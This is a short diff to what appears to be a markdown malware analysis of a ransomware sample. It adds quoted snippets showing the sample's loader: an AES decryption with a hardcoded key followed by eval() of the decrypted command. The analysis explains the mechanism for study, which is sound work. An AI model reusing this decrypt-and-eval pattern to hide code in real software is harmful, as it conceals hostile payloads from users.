@@ -155,7 +155,24 @@ function runRansomware() {
 }
 ```
 
-This function executes code, which is decrypted from **cmd** with **key_cmd** key.
+This function executes code...
+
+```javascript
+	eval(dec_cmd);
+```
+
+...which is decrypted from **cmd** with **key_cmd** key:
+
+```javascript
+	// key
+	var key_cmd = "2c025c0a1a45d1f18df9ca3514babdbc";
+	// AES decrypt using key_cmd as a key   
+    var dec_cmd = CryptoJS.AES.decrypt(cmd, key_cmd);
+    // change decrypted code to UTF-8 string      
+    dec_cmd = CryptoJS.enc.Utf8.stringify(dec_cmd); 
+```
+
+
 This code contains following instructions:
 
 ```javascript
